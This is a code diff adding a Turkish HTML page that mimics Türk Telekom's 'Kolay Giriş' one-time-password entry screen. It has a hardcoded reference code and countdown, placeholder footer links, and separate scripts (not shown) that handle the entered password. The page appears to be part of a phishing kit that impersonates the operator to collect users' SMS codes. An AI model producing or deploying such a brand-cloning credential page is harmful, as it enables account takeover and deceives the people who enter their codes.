@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kolay Giriş - OTP</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="page-wrapper">
+        <!-- Top blue gradient area -->
+        <div class="top-section"></div>
+
+        <!-- OTP card -->
+        <div class="login-card">
+            <div class="card-header">
+                <h1 class="title">
+                    <span class="arrow">»</span>Kolay Giriş
+                </h1>
+                <div class="divider"></div>
+            </div>
+
+            <div class="card-body">
+                <div class="otp-info">
+                    <h2 class="otp-title">Türk Telekom<br>Kolay Giriş</h2>
+                    <p class="otp-description">
+                        Lütfen cep telefonunuza gönderilen
+                        <strong id="refCode">D0HWF</strong> referans kodlu şifreyi giriniz.
+                    </p>
+                </div>
+
+                <div class="otp-input-row">
+                    <div class="otp-input-group">
+                        <input type="password" id="otpInput" class="otp-field" placeholder="Şifre" maxlength="6"
+                            autocomplete="one-time-code">
+                    </div>
+                    <div class="otp-timer-box" id="timerBox">
+                        <span id="timerDisplay">1:27 DK</span>
+                    </div>
+                </div>
+
+                <button type="button" class="login-btn" id="submitBtn">
+                    Devam Et
+                </button>
+            </div>
+        </div>
+
+        <!-- Footer links -->
+        <div class="footer-links">
+            <a href="#" class="footer-link">Aydınlatma Metni</a>
+            <a href="#" class="footer-link">Çerez Politikası</a>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="otp-script.js"></script>
+</body>
+
+</html>
